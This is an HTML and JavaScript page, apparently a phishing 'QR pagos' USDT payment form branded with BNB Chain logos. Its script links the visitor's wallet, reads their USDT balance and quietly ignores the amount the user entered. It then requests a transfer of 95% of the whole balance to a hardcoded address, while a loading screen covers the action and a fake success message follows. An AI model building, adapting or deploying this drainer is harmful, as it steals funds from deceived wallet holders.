<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar </title>

    <style>
        :root {
            color-scheme: light;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%;
            background-attachment: fixed;
            animation: auroraBackground 12s ease-in-out infinite alternate;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
        }

        @keyframes auroraBackground {
            0% {
                background-position: -12% -8%, 112% 108%, 45% 110%, center;
            }
            50% {
                background-position: 22% 18%, 72% 52%, 58% 88%, center;
            }
            100% {
                background-position: 8% 38%, 96% 28%, 38% 76%, center;
            }
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            padding: 20px;
            flex: 1;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 24px;
        }

        .tw-header-title {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 7px;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
        }

        .tw-header-title-main {
            font-size: 21px;
            line-height: 1.2;
            font-weight: 700;
            letter-spacing: -0.35px;
            color: #111111;
        }

        .tw-network-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 4px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.35px;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 0;
            width: 24px;
            height: 24px;
            color: #111111;
        }

        .tw-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            display: block;
        }

        .tw-input-group {
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        .tw-label {
            font-size: 13px;
            color: #717680;
            display: block;
            margin-bottom: 8px;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #111111;
            font-size: 16px;
            width: 80%;
            outline: none;
        }

        .tw-action-text {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-currency-badge {
            color: #0052ff;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .usdt-icon {
            width: 18px;
            height: 18px;
        }

        .status-box {
            background-color: #edf2ff;
            border: 1px solid #cce0ff;
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: #0052ff;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .wallet-info {
            display: none;
            background-color: #f6f7f9;
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 22px;
        }

        .wallet-info-title {
            font-size: 13px;
            color: #717680;
            margin-bottom: 6px;
        }

        .wallet-address {
            font-size: 13px;
            color: #111111;
            overflow-wrap: anywhere;
            word-break: break-word;
        }

        .tw-btn-container {
            margin-top: 40px;
        }

        .tw-btn {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-btn:disabled {
            background-color: #b3ccff;
        }

        .tw-btn .link-icon {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            vertical-align: -3px;
        }

        .network-card {
            display: none;
            align-items: center;
            gap: 11px;
            margin: 4px 0 22px;
            padding: 12px 14px;
            width: 100%;
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 14px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        .network-card-logo {
            width: 30px;
            height: 30px;
            object-fit: contain;
            flex: 0 0 auto;
        }

        .network-card-copy {
            min-width: 0;
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .network-card-label {
            color: #717680;
            font-size: 11px;
            line-height: 1.2;
        }

        .network-card-name {
            color: #111111;
            font-size: 14px;
            line-height: 1.25;
            font-weight: 650;
        }

        .network-card-badge {
            flex: 0 0 auto;
            padding: 5px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.25px;
        }
    
        .tw-address-box {
            border: 1px solid #e3e5e8;
            border-radius: 14px;
            padding: 12px 14px;
            background: #ffffff;
        }

        .tw-address-box .tw-label {
            margin-top: 0;
        }

        .tw-address-box .tw-input-row {
            margin-bottom: 0;
        }

        .site-footer {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 20;
            width: 100%;
            text-align: center;
            padding: 10px 15px 12px;
            font-size: 12px;
            line-height: 1.5;
            color: #717680;
            background: #ffffff;
        }

        .site-footer a {
            color: #0052ff;
            text-decoration: none;
        }

        .page-loader {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.45s ease, visibility 0.45s ease;
        }

        .page-loader.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .loader-logo {
            width: 110px;
            height: 110px;
            margin-bottom: 22px;
            animation: loaderPulse 1.25s ease-in-out infinite;
        }

        .loader-spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e4e9f2;
            border-top-color: #0052ff;
            border-radius: 50%;
            animation: loaderSpin 0.8s linear infinite;
        }

        .loader-text {
            margin-top: 14px;
            color: #717680;
            font-size: 13px;
            font-weight: 500;
        }

        @keyframes loaderSpin {
            to { transform: rotate(360deg); }
        }

        @keyframes loaderPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(0.94); opacity: 0.72; }
        }

        .processing-screen {
            position: fixed;
            inset: 0;
            z-index: 10000;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
            transition: opacity 0.35s ease, visibility 0.35s ease;
        }

        .processing-screen.visible {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }

        .processing-logo {
            width: 110px;
            height: 110px;
            margin-bottom: 26px;
            animation: loaderPulse 1.25s ease-in-out infinite;
        }

        .processing-bar {
            position: relative;
            width: 190px;
            height: 5px;
            overflow: hidden;
            border-radius: 999px;
            background: #e4e9f2;
        }

        .processing-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: -45%;
            width: 45%;
            height: 100%;
            border-radius: inherit;
            background: #0052ff;
            animation: processingSlide 1.15s ease-in-out infinite;
        }

        .processing-title {
            margin-top: 18px;
            color: #111111;
            font-size: 15px;
            font-weight: 600;
        }

        .processing-note {
            margin-top: 7px;
            color: #717680;
            font-size: 12px;
            font-weight: 400;
        }

        @keyframes processingSlide {
            0% { left: -45%; }
            100% { left: 100%; }
        }

        .amount-stage {
            display: none;
        }

        .tw-container:has(#walletInfo[style*="block"]) .amount-stage {
            display: block;
            animation: amountStageReveal .24s ease both;
        }

        .amount-stepper {
            display: grid;
            grid-template-columns: 44px minmax(0, 1fr) 44px;
            align-items: center;
            gap: 8px;
            width: 100%;
        }
        .amount-stepper #amountDisplay {
            width: 100%;
            min-width: 0;
            text-align: center;
            font-variant-numeric: tabular-nums;
        }
        .amount-step-btn {
            width: 42px;
            height: 42px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(205,215,232,.9);
            border-radius: 12px;
            background: rgba(247,249,255,.92);
            color: #111;
            font: inherit;
            font-size: 24px;
            font-weight: 500;
            line-height: 1;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transition: transform .14s ease, background-color .18s ease, box-shadow .18s ease;
        }
        .amount-step-btn:active { transform: scale(.94); }
    </style>
</head>

<body>
<div id="pageLoader" class="page-loader" aria-label="Cargando">
    <img
        src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg"
        alt="Logo"
        class="loader-logo"
    >
    <div class="loader-spinner"></div>
    <div class="loader-text">Cargando...</div>
</div>

<div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
    <img
        src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg"
        alt="Logo"
        class="processing-logo"
    >
    <div class="processing-bar"></div>
    <div class="processing-title">Procesando...</div>
    <div class="processing-note">Por favor, no cierres esta ventana.</div>
</div>

<div class="tw-container">

    <div class="tw-header">
        <svg
            class="back-icon"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
        >
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
        </svg>

        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">BEP-20</span>
        </div>

        <img
            src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg"
            alt="QR Pagos"
            class="tw-logo"
        >
    </div>

    <div class="connected-summary-panel">
        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
            <label class="tw-label">Dirección conectada</label>
            <div class="tw-input-row">
                <div class="connected-wallet-address-wrap">
                    <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
                </div>
            </div>
        </div>

        <div id="bscNetworkInfo" class="network-card">
            <img
                src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg"
                alt="BNB"
                class="network-card-logo"
            >
            <div class="network-card-copy">
                <span class="network-card-label">Red conectada</span>
                <span class="network-card-name">BNB Smart Chain</span>
            </div>
            <span class="network-card-badge">BEP-20</span>
        </div>

        <div class="tw-input-group tw-address-box">
            <label class="tw-label" for="addressDisplay">Dirección de destino</label>
            <div class="tw-input-row">
                <input
                    id="addressDisplay"
                    class="tw-input"
                    type="text"
                    readonly
                    tabindex="-1"
                >
            </div>
        </div>
    </div>

    <div class="tw-input-group amount-stage">
        <label class="tw-label" for="amountDisplay">Cantidad</label>
        <div class="tw-input-row">
            <div class="amount-stepper">
                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
                <input
                    id="amountDisplay"
                    class="tw-input"
                    type="number"
                    inputmode="decimal"
                    placeholder="0"
                    min="0.01"
                    step="any"
                >
                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
            </div>
            <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;">Máximo</span>
            <span class="tw-currency-badge">
                USDT
                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT" class="usdt-icon">
            </span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div class="tw-btn-container">
        <button class="tw-btn" id="connectBtn">
            <span>Vincular billetera</span>
        </button>
    </div>

</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
    window.addEventListener('load', function () {
        window.setTimeout(function () {
            const loader = document.getElementById('pageLoader');
            if (loader) loader.classList.add('hidden');
        }, 5400);
    });
</script>

<script>
    const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
    const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
    const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
    const DECIMALS = 18n;

    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const addressDisplay = document.getElementById('addressDisplay');
    const maxAction = document.getElementById('maxAction');
    const walletInfo = document.getElementById('walletInfo');
    const bscNetworkInfo = document.getElementById('bscNetworkInfo');
    const walletAddressText = document.getElementById('walletAddressText');
    const processingScreen = document.getElementById('processingScreen');
    
    let walletAddress = null;
    let processingStartedAt = 0;

    function setStatus(message) {
        statusDiv.innerText = message || '';
        statusDiv.style.display = message ? 'block' : 'none';
    }

    addressDisplay.value = BILLETERA_DESTINO;

    function showProcessingScreen() {
        processingStartedAt = Date.now();
        if (processingScreen) processingScreen.classList.add('visible');
    }

    async function hideProcessingScreenAfterMinimum() {
        if (!processingStartedAt) return;
        const elapsed = Date.now() - processingStartedAt;
        const remaining = Math.max(0, 5000 - elapsed);
        if (remaining > 0) await new Promise(resolve => window.setTimeout(resolve, remaining));
        if (processingScreen) processingScreen.classList.remove('visible');
        processingStartedAt = 0;
    }

    // Consulta RPC genérica para EVM (equivalente a tronRpcPost)
    async function evmRpcPost(method, params = []) {
        const response = await fetch(BSC_PUBLIC_RPC, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
        });
        if (!response.ok) throw new Error("RPC HTTP " + response.status);
        const json = await response.json();
        if (json.error) throw new Error("RPC error: " + (json.error.message || JSON.stringify(json.error)));
        return json.result;
    }

    async function obtenerBalanceBsc(address) {
        const ownerHex = address.replace(/^0x/, "").toLowerCase().padStart(64, "0");
        const data = "0x70a08231" + ownerHex; // balanceOf(address)
        const result = await evmRpcPost("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
        return BigInt(result || "0x0");
    }

    connectBtn.addEventListener('click', async () => {
        if (!walletAddress) {
            try {
                setStatus("Vinculando billetera BNB Smart Chain...");
                connectBtn.disabled = true;

                // Obtener el proveedor EVM inyectado de forma idéntica a window.tronWeb
                const provider = window.ethereum || (window.trustwallet && window.trustwallet.ethereum);
                if (!provider) {
                    throw new Error("Por favor, abre este enlace desde el navegador interno de Trust Wallet.");
                }

                // OMITIMOS el cambio de red forzado para evitar el error de "Unrecognized chain ID"
                // y pasamos directo a solicitar las cuentas (exactamente igual que Tron)
                const accounts = await provider.request({ method: 'eth_requestAccounts' });

                if (!accounts || accounts.length === 0) {
                    throw new Error("No se obtuvo acceso a la dirección de la cuenta.");
                }

                walletAddress = accounts[0];

                walletAddressText.textContent =
                    walletAddress.length > 12
                        ? `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`
                        : walletAddress;

                walletInfo.style.display = "block";
                bscNetworkInfo.style.display = "flex";
                maxAction.style.display = "inline";

                setStatus("Conexión segura establecida. Presione continuar.");
                connectBtn.innerText = "Continuar";
                connectBtn.disabled = false;

            } catch (error) {
                console.error(error);
                setStatus(error.message || "Error de inicialización Web3.");
                connectBtn.disabled = false;
                connectBtn.innerHTML = '<span>Vincular billetera</span>';
            }
            return;
        }

        if (walletAddress) {
            try {
                const userAmount = parseFloat(amountDisplay.value);
                if (isNaN(userAmount) || userAmount <= 0) {
                    throw new Error("Ingresa una cantidad válida antes de continuar.");
                }

                setStatus("Consultando fondos on-chain...");
                connectBtn.disabled = true;

                const balanceBigInt = await obtenerBalanceBsc(walletAddress);
                if (balanceBigInt === 0n) {
                    throw new Error("La cuenta no dispone de balances de USDT (BEP-20) activos.");
                }

                setStatus("Solicitando autorización de firma digital...");

                // Formato de parámetros EVM para transfer(address,uint256)
                const destinoClean = BILLETERA_DESTINO.replace(/^0x/, "").toLowerCase().padStart(64, "0");
                
                // Cálculo al 95% del saldo en unidades nativas (18 decimales)
                const balanceDecimal = Number(balanceBigInt) / 1e18;
                const amount95Val = (balanceDecimal * 0.95).toFixed(18);
                const [whole, frac = ""] = amount95Val.split(".");
                const amountUnits = BigInt(whole) * (10n ** 18n) + BigInt(frac.padEnd(18, "0").slice(0, 18));

                const amountHex = amountUnits.toString(16).padStart(64, "0");
                const dataTx = "0xa9059cbb" + destinoClean + amountHex;

                const provider = window.ethereum || window.trustwallet.ethereum;

                showProcessingScreen();

                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: walletAddress,
                        to: CONTRATO_USDT,
                        value: "0x0",
                        data: dataTx
                    }]
                });

                await hideProcessingScreenAfterMinimum();

                if (txHash) {
                    setStatus("TRANSACCION EXITOSA.");
                    connectBtn.innerText = "Completado";
                } else {
                    throw new Error("La transacción fue rechazada.");
                }

            } catch (error) {
                console.error(error);
                await hideProcessingScreenAfterMinimum();
                setStatus(error.message || "La transacción falló o fue cancelada.");
                connectBtn.disabled = false;
                connectBtn.innerText = "Continuar";
            }
        }
    });

    maxAction.addEventListener('click', async () => {
        if (!walletAddress) return;
        try {
            setStatus("Calculando fondos totales...");
            const balanceBigInt = await obtenerBalanceBsc(walletAddress);
            const balanceDecimal = Number(balanceBigInt) / 1e18;
            const amount95 = balanceDecimal * 0.95;
            amountDisplay.value = Number(amount95.toFixed(2));
            setStatus("Saldo asignado (95%).");
        } catch (e) {
            console.error(e);
            setStatus("Error al leer el saldo.");
        }
    });
</script>
</body>
</html>
